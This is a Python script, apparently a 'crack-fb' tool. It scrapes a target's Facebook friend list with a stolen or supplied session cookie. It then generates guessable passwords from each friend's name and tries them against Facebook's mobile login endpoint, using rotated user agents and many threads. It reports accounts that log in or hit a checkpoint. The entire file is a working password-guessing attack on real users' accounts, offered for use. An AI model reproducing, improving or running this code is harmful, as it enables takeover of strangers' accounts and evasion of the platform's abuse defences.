import requests
from bs4 import BeautifulSoup
from datetime import datetime
import logging, os, sys, time, random, json, re, concurrent.futures
from colorama import Style, Back, Fore, init
ses = requests.Session()

init(True)
base_url = "https://mbasic.facebook.com"
logging.basicConfig(level=logging.INFO, format='- %(levelname)s > %(message)s')
user_agent = ["Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A37m Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.8.4", "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; A31 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.114 Mobile Safari/537.36 OppoBrowser/3.9.2", "Mozilla/5.0 (Linux; Android 10; vivo 1935; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/10.8.0.0", "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1801 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/10.6.0.3", "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-G991B/G991BXXU3AUE1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36"]
total = 0
count_data = 0

def parsing(url: str, cookie: str):
    return BeautifulSoup(
        requests.get(url, headers={"cookie": cookie}).text, "html.parser")

def check_login(cookie: str) -> bool:
    if"mbasic_logout_button" in str(parsing(base_url, cookie)):
        logging.info(
            f"{Fore.GREEN}check login succes{Fore.RESET}")
        return True
    else:
        logging.error(
            f"{Fore.YELLOW}check login false{Fore.RESET}")
        return False
        
def account_information(me: str) -> str:
    html = parsing(base_url+me, cookie)
    name = html.find("title").text
    id_user = html.find(
        "input", attrs={"type": "hidden", "name": "target"})["value"]
    return name, id_user
    
def generate_passwords(password):
    parts = password.split(" ")
    password_list = [parts[0] + "123", parts[0] + "1234", parts[0] + "12345", password]
    return password_list
    
def crack(username, password, ok=0, cp=0):
    global total, count_data
    for pw in password:
        agent = random.choice(user_agent)
        sys.stdout.write(
            f"\r[{str(datetime.now().hour) + ':' + str(datetime.now().minute) + ':' + str(datetime.now().second)}] crack {total}/{count_data} : ok-{ok} cp-{cp}")
        sys.stdout.flush()
        try:
            html = BeautifulSoup(
                ses.get(base_url, headers = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'viewport-width': '980', 'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"6.0.1"', 'sec-ch-ua-full-version-list': '"Chromium";v="106.0.5249.126", "Google Chrome";v="106.0.5249.126", "Not;A=Brand";v="99.0.0.0"', 'sec-ch-prefers-color-scheme': 'light', 'upgrade-insecure-requests': '1', 'user-agent': agent, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}).text, "html.parser")
            data = {'lsd': html.find("input", attrs={"type": "hidden", "name": "lsd"})["value"], 'jazoest': html.find("input", attrs={"type": "hidden", "name": "jazoest"})["value"], 'm_ts': html.find("input", attrs={"type": "hidden", "name": "m_ts"})["value"], 'li': html.find("input", attrs={"type": "hidden", "name": "li"})["value"], 'try_number': '0', 'unrecognized_tries': '0', 'email': username, 'pass': pw, 'login': 'Masuk', 'bi_xrwh': '0'}
            response = ses.post(
                base_url+"/login/device-based/regular/login/", headers = {'Host': 'mbasic.facebook.com', 'content-length': '160', 'cache-control': 'max-age=0', 'viewport-width': '980', 'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"6.0.1"', 'sec-ch-ua-full-version-list': '"Chromium";v="106.0.5249.126", "Google Chrome";v="106.0.5249.126", "Not;A=Brand";v="99.0.0.0"', 'sec-ch-prefers-color-scheme': 'light', 'upgrade-insecure-requests': '1', 'origin': 'https://mbasic.facebook.com', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': agent, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': 'https://mbasic.facebook.com/', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}, data=data)
            c = ses.cookies.get_dict()
            if ("c_user" in str(c)):
                print(
                    f"OK {username} - {pw}")
                ok+=1
                continue
            if ("checkpoint" in str(c)):
                print(
                    f"CP {username} - {pw}")
                cp+=1
                continue
        except Exception as e:
            # print(e)
            continue

    total+=1

def friend(url: str, account=[]):
    html= parsing(url, cookie)
    for data in re.findall(
        r'style="vertical-align: middle"><a class=".." href="(.*?)">(.*?)</a>', str(html)):
            if (
                "/profile.php?" in data[0]):
                    username = re.search(
                        r"\/profile.php\?id\=([0-9]*)", str(data[0]))[1]
            else:
                username = re.search(
                    r"\/(.*?)\?", str(data[0]))[1]
            
            account.append(
                f"{username}-{data[1].lower()}")
            print(
                f"{Style.BRIGHT}* gathering friends: {Fore.YELLOW}{len(account)}{Fore.RESET}", end="\r", flush=True)
    if (
        "Lihat Teman Lain" in str(html)):
            more = html.find(
                "a", string="Lihat Teman Lain")["href"]
            friend(base_url+more)
    else:
        logging.info(
            f"{Style.BRIGHT}{Fore.YELLOW}crack running...{Fore.RESET}\n")
        username, password_parts = zip(
            *(item.split('-') for item in account))
        with concurrent.futures.ThreadPoolExecutor() as executor:
            list(
                executor.map(crack, username, (generate_passwords(password_part) for password_part in password_parts)))
        print(
            f"\n\n* {Style.BRIGHT}{Fore.GREEN}crack finished..{Fore.RESET}")
            
def get_data(url: str):
    global count_data
    html = parsing(url, cookie)
    print(
        "\n! check account, please wait..")
    target_name = html.find("title").text
    if (
        target_name == "Konten Tidak Ditemukan"):
            logging.error(
                f"{Fore.RED}account not found, please try again{Fore.RESET}")
            return False
    logging.info(
        f"Name: {Fore.GREEN}{target_name}{Fore.RESET}")
    try:
        total_friend = re.search(
            r'<h3 class=".*">Teman (.*?)</h3', str(html))[1].replace("(", "").replace(")", "")
        count_data = total_friend
        logging.info(
            f"Friends: {Fore.GREEN}{total_friend}{Fore.RESET}")
        result = friend(url)
    except Exception as e:
        logging.error(
            # f"{Fore.YELLOW}{e}{Fore.RESET}")
            f"{Fore.YELLOW}friend not found, please try again{Fore.RESET}")

def public_friendlist() -> None:
    target_account = input(
        f"{Style.BRIGHT}{Fore.YELLOW}?{Fore.RESET} target username/id: ")
    data = get_data(base_url+"/"+target_account+"/"+"friends")

def friendlist() -> None:
    target_account = account_information("/profile.php")[1]
    data= get_data(base_url+"/"+target_account+"/"+"friends")


def logout_tools():
    logging.info(
        f"{Style.BRIGHT}{Fore.RED}logout{Fore.RESET}")
    return True

def menu(cursor="?") -> None:
    name, id_user = account_information("/profile.php")
    menu = json.load(open("./assets/menu.json", "r"))
    os.system("cls" if os.name == "nt" else "clear")
    print(
        f"{Style.BRIGHT}/ \__\n(    {Fore.RED}@{Fore.RESET}\___\t{Fore.MAGENTA}[{Fore.RESET} c r a c k - f b {Fore.MAGENTA}]{Fore.RESET}\n/   (_____/\n/_____/   {Fore.YELLOW}U{Fore.RESET}")
    logging.info(
        f"{Fore.GREEN}login{Fore.RESET}: {Style.BRIGHT}{name}")
    logging.info(
        f"{Fore.GREEN}id{Fore.RESET}: {Style.BRIGHT}{id_user}\n")
    for key, value in menu.items():
        print(
            f"- {Fore.YELLOW}{key}{Fore.RESET}. {Style.BRIGHT}{value[0]}")
            
    option = input(
        f"\n{Fore.YELLOW}{cursor}{Fore.RESET} choice: ")
    
    if option in menu:
        choice = menu[option][1]
        if choice:
            try: exec(choice+"()")
            except Exception as e: logging.error(
                f"{Fore.YELLOW}This menu is not yet available, sorry")
        else: pass
    else:
        logging.error(
            f"{Fore.YELLOW}Menu not found")

  
def login(cursor="?") -> None:
    print(
        "\n\n\tUppsss... login your account >\"<\n")
    cookie = input(f"{Fore.YELLOW}{cursor}{Fore.RESET} cookie: ")
    if check_login(cookie):
        open("./assets/cookie.txt", "w").write(cookie)
        menu()
    else: login()

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    cookie = open(
        "./assets/cookie.txt", "r").read().strip()
    if check_login(cookie): menu()
    else: login()